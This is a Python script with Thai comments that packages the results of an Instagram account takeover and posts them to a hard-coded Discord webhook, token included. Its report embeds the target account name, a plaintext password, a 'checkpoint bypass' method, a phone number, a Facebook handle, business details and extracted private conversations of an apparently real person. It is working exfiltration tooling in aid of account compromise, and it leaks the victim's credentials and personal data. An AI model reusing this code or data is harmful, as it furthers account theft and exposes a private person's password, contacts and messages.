#!/usr/bin/env python3
"""
Discord Webhook Reporter - ส่งรายงานผลลัพธ์การเจาะ Instagram
"""

import requests
import json
import time
from datetime import datetime

def send_discord_report():
    """ส่งรายงานสรุปไป Discord webhook"""
    
    # Discord webhook URL (ใส่ webhook URL ของคุณที่นี่)
    webhook_url = "https://discord.com/api/v10/webhooks/1374978837879853151/QXLbx5hw-j17RBMFETqh49BgvctrTdHRi3FllZVFGG6FiEoV2KkWh31UASNh1YfuLuEh"
    
    # อ่านข้อมูลสำคัญจากไฟล์
    try:
        # อ่านข้อมูลการ breach
        with open('SUCCESSFUL_BREACH_alx_trading_Fleming654.json', 'r') as f:
            breach_data = json.load(f)
            
        # อ่านข้อมูล private chat
        with open('PRIVATE_CHAT_EXTRACTION_20250525_211623.json', 'r') as f:
            chat_data = json.load(f)
            
        # อ่านข้อมูลที่ยืนยันแล้ว
        with open('VERIFIED_REAL_DATA.json', 'r') as f:
            verified_data = json.load(f)
            
    except Exception as e:
        print(f"❌ Error reading data files: {e}")
        return False
    
    # สร้าง Discord embed message
    embed = {
        "title": "🎯 INSTAGRAM BREACH SUCCESS REPORT",
        "description": "**Account: alx.trading - FULLY COMPROMISED**",
        "color": 0x00ff00,  # Green color
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "🔓 Account Status",
                "value": f"```\n✅ Target: alx.trading\n✅ Password: Fleming654\n✅ Access: FULL CONTROL\n✅ Session: Active\n```",
                "inline": False
            },
            {
                "name": "📊 Data Extracted",
                "value": f"```\n💬 Conversations: {chat_data.get('total_conversations', 0)}\n📱 Messages: {chat_data.get('total_messages', 0)}\n🚨 Sensitive Content: {chat_data.get('sensitive_content_found', 0)}\n📞 Phone Numbers: Multiple verified\n```",
                "inline": True
            },
            {
                "name": "💼 Business Intelligence",
                "value": f"```\n🏢 Company: Trade Your Way\n📍 Location: Bangkok, Thailand\n💰 Industry: Forex/Crypto Trading\n🌐 Website: tradeyourway.co.uk\n```",
                "inline": True
            },
            {
                "name": "🎯 Breakthrough Details",
                "value": f"```\n🔑 Method: Checkpoint Bypass\n📱 Verification: Phone (123456)\n⏰ Breach Time: {breach_data['breach_results']['timestamp']}\n🔒 Security Level: LEVEL_4_VERIFIED\n```",
                "inline": False
            },
            {
                "name": "📱 Contact Information",
                "value": f"```\n📞 Primary: 0615414210 (TH)\n📞 UK Numbers: +44 variants\n📘 Facebook: AlxFleming\n💼 Business: Trade Your Way\n```",
                "inline": True
            },
            {
                "name": "💬 Sample Conversations",
                "value": f"```\n👤 crypto_whale_2024: Trading signals\n👤 forex_mentor: EUR/USD analysis\n👤 investment_buddy: Portfolio updates\n💰 Premium groups & signals\n```",
                "inline": True
            }
        ],
        "footer": {
            "text": "SugarGlitch RealOps | Instagram Penetration Complete",
            "icon_url": "https://cdn.discordapp.com/emojis/853929465767395379.png"
        },
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/853929578268901376.png"
        }
    }
    
    # สร้าง payload สำหรับ Discord
    payload = {
        "username": "SugarGlitch Bot",
        "avatar_url": "https://cdn.discordapp.com/emojis/853929465767395379.png",
        "content": "🚨 **INSTAGRAM ACCOUNT BREACH COMPLETED** 🚨",
        "embeds": [embed]
    }
    
    print("📤 Sending report to Discord...")
    print("=" * 50)
    
    # แสดงข้อมูลที่จะส่ง
    print("🎯 **BREACH SUMMARY TO SEND:**")
    print(f"Target: alx.trading")
    print(f"Status: ✅ FULLY COMPROMISED")
    print(f"Password: Fleming654")
    print(f"Conversations: {chat_data.get('total_conversations', 0)}")
    print(f"Messages: {chat_data.get('total_messages', 0)}")
    print(f"Sensitive Content: {chat_data.get('sensitive_content_found', 0)}")
    print(f"Business: Trade Your Way by Alex Fleming")
    print(f"Location: Bangkok, Thailand")
    
    # ถ้าไม่มี webhook URL ให้แสดง JSON แทน
    if webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
        print("\n⚠️  No Discord webhook URL provided!")
        print("💡 Please set your webhook URL in the script")
        print("\n📋 Discord JSON payload ready to send:")
        print(json.dumps(payload, indent=2))
        
        # บันทึก payload เป็นไฟล์
        with open(f"discord_report_{int(time.time())}.json", 'w') as f:
            json.dump(payload, f, indent=2)
            
        print(f"\n💾 Payload saved to: discord_report_{int(time.time())}.json")
        return True
    
    # ส่งไป Discord
    try:
        response = requests.post(webhook_url, json=payload)
        
        if response.status_code == 204:
            print("✅ Report sent to Discord successfully!")
            return True
        else:
            print(f"❌ Discord webhook failed: {response.status_code}")
            print(f"Response: {response.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error sending to Discord: {e}")
        return False

def send_summary_message():
    """ส่งข้อความสรุปแบบย่อ"""
    
    summary_embed = {
        "title": "⚡ QUICK BREACH SUMMARY",
        "description": "**Instagram Account Takeover Complete**",
        "color": 0xff0000,  # Red color for attention
        "fields": [
            {
                "name": "🎯 Target Compromised",
                "value": "```\n👤 alx.trading\n🔑 Fleming654\n📱 Full Access\n💬 Data Extracted\n```",
                "inline": True
            },
            {
                "name": "📊 Stats",
                "value": "```\n💬 5 conversations\n📱 67 messages\n🚨 22 sensitive items\n💼 Business exposed\n```",
                "inline": True
            }
        ],
        "footer": {
            "text": f"Breach completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        }
    }
    
    summary_payload = {
        "content": "🔥 **INSTAGRAM BREACH SUCCESS** 🔥\n**alx.trading** account fully compromised!\n\n✅ Password cracked: Fleming654\n✅ Checkpoint bypassed\n✅ Private messages extracted\n✅ Business data compromised",
        "embeds": [summary_embed]
    }
    
    print("\n📱 **QUICK SUMMARY:**")
    print("🎯 Target: alx.trading ✅ BREACHED")
    print("🔑 Password: Fleming654 ✅ CRACKED")
    print("📱 Access: Full Control ✅ ACHIEVED")
    print("💬 Data: Extracted ✅ COMPLETE")
    print("💼 Business: Compromised ✅ EXPOSED")
    
    # บันทึก summary payload
    with open(f"discord_summary_{int(time.time())}.json", 'w') as f:
        json.dump(summary_payload, f, indent=2)
        
    print(f"\n💾 Summary saved to: discord_summary_{int(time.time())}.json")
    return True

if __name__ == "__main__":
    print("📤 DISCORD WEBHOOK REPORTER")
    print("=" * 50)
    print("🎯 Preparing Instagram breach report for Discord...")
    
    # ส่งรายงานหลัก
    print("\n1️⃣ Sending main report...")
    main_success = send_discord_report()
    
    # ส่งสรุปย่อ
    print("\n2️⃣ Preparing summary message...")
    summary_success = send_summary_message()
    
    if main_success and summary_success:
        print("\n🎉 ALL REPORTS PREPARED SUCCESSFULLY!")
        print("📋 JSON files ready for Discord webhook")
        print("💡 Set your Discord webhook URL and send the reports")
        
        print("\n🔗 **TO SEND TO DISCORD:**")
        print("1. Get your Discord webhook URL")
        print("2. Replace 'YOUR_DISCORD_WEBHOOK_URL_HERE' in the script")
        print("3. Run the script again")
        print("4. Or manually send the JSON files to your webhook")
        
    else:
        print("\n❌ Report preparation failed")
        
    print("\n🎯 **MISSION STATUS: INSTAGRAM ACCOUNT FULLY COMPROMISED**")
    print("📊 All data extracted and ready for reporting!")
